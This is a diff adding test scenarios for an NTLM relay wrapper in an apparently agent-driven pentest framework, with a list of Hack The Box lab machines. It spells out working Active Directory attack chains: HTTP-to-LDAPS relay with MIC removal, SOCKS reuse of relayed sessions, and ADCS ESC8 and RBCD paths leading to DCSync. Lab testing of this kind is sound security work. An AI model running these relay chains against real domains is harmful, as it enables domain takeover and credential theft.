+## Scenario 27b: Cross-protocol relay HTTP-to-LDAPS
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, remove_mic: true}
+Expected: success=true, relay listening on HTTP port 80
+Notes: HTTP-to-LDAPS cross-protocol. WebDAV coercion triggers HTTP NTLM auth,
+       relayed to LDAPS. --remove-mic is required for cross-protocol.
+       This is the most reliable relay path because:
+       1. HTTP inbound bypasses SMB signing requirements
+       2. LDAPS outbound bypasses LDAP signing requirements (uses TLS)
+       3. WebDAV coercion works even when outbound SMB is blocked
+
+## Scenario 37: ntlmrelayx binary not found
+Method: start
+Args: {target: "ldaps://10.0.0.1", listen_port: 80}
+Setup: Container without impacket-scripts installed
+Expected: success=false, error_class="config", error contains "not found"
+Notes: Tests FileNotFoundError handling in start_relay.
+
+## Scenario 38: Target unreachable (connection refused)
+Method: start
+Args: {target: "ldaps://10.0.0.99", listen_port: 80}
+Expected: Relay starts (target reachability is checked at relay time, not start time).
+          After coercion: status shows error_class="network", retryable=true,
+          errors contain "connection refused" or "errno 111"
+Notes: The target DC may have been taken offline between start and coercion.
+       The relay listener runs fine but the outbound relay connection fails.
+
+## Scenario 39: Stale relay cleanup on start (REQ-RES-006)
+Method: start (after a previous relay exited on its own)
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80}
+Expected: success=true. Log should show "Cleaned up N stale relay(s)" if previous
+          relay processes had exited.
+Notes: Tests _cleanup_stale_relays() called in start_relay().
+       Stale relays occur when ntlmrelayx exits on its own (timeout, target
+       disconnection) without an explicit stop() call.
+
+## Scenario 40: Relay with SOCKS proxy mode
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, socks: true}
+Expected: success=true, relay running. After successful coercion:
+          A SOCKS proxy is available for using the relayed session.
+Notes: SOCKS mode keeps the relayed session alive for interactive use.
+       The agent can then use proxychains with the SOCKS port to run
+       tools through the relayed authenticated session.
+       When socks=true, --no-smb-server is NOT auto-added (socks needs SMB).
+
+## Scenario 41: ADCS relay incorrect target URL format
+Method: start
+Args: {target: "http://<CA_IP>/certsrv", listen_port: 80, adcs: true,
+       adcs_template: "DomainController"}
+Expected: Relay starts. After coercion: may fail with enrollment error.
+Notes: The correct ESC8 URL must end with /certfnsh.asp. Using just /certsrv
+       may cause the certificate request to fail because ntlmrelayx POSTs to
+       the wrong endpoint. Agent should always use the full path:
+       http://<CA>/certsrv/certfnsh.asp
+
+## Scenario 42: Relay output large (>5000 chars) -- output store interaction
+Method: start, coerce repeatedly, status
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80}
+Expected: When raw_output exceeds 5000 chars, opensploit should store it in the
+          output store and return a summary with reference ID (REQ-ARC-024).
+Notes: In the Pirate engagement, verbose relay output (~6000+ chars with all protocol
+       client loading messages) was sent inline. This contributes to context rot in
+       long engagements. The output store truncation prevents this.
+
+# =============================================================================
+# RECOMMENDED HTB BOXES FOR TESTING
+# =============================================================================
+#
+# PRIORITY 1: Certified (HTB, Medium, Retired)
+#   - Full ADCS ESC8 relay chain: coerce DC -> relay to CA -> get cert -> PKINIT -> DCSync
+#   - Tests: Scenarios 6, 7, 8, 8b, 31
+#   - Also tests shadow credentials path (alternative to ESC8)
+#   - Clean ADCS environment with default templates
+#   - Coercion: PetitPotam should work (older box, may not be fully patched)
+#
+# PRIORITY 2: Escape (HTB, Medium, Retired)
+#   - ADCS + shadow credentials relay combination
+#   - Tests: Scenarios 6, 10, 11, 11b, 12, 12b
+#   - Has both ESC8-vulnerable CA and GenericWrite for shadow creds
+#   - Good for testing parallel ADCS + shadow cred relays (Scenario 13b)
+#
+# PRIORITY 3: Pirate (HTB, Hard, Retired)
+#   - Full RBCD relay chain with PrinterBug coercion
+#   - Tests: Scenarios 1-5h, 28, 33, 5b
+#   - Multi-host AD with pivoting (DC01 + WEB01)
+#   - Best box for testing stuck state recovery (Scenarios 17-21c)
+#   - Known: PetitPotam patched, PrinterBug works, LDAP signing enforced
+#   - WARNING: This box consistently triggers stuck state (3 engagements, 3 stuck states)
+#
+# PRIORITY 4: Garfield (HTB, Hard, Active)
+#   - Recent AD box with RBCD relay path
+#   - Tests: Scenarios 1-5h, 21b (stuck state regression)
+#   - Confirmed stuck state bug on 2026-04-08 (latest evidence)
+#   - Good for validating fixes to stuck state handling
+#
+# PRIORITY 5: Authority (HTB, Medium, Retired)
+#   - ADCS ESC7 + ESC8 chain
+#   - Tests: Scenarios 6, 9, 9b
+#   - Has ADCS misconfiguration that requires specific template selection
+#   - Good for testing wrong template error handling (Scenario 9)
+#
+# RECOMMENDED FIRST TEST: Certified
+#   - Cleanest ADCS environment for ESC8 relay validation
+#   - Medium difficulty = less time debugging unrelated issues
+#   - Well-documented box with known working paths
+#   - Tests the most common relay use case (ESC8 to CA)
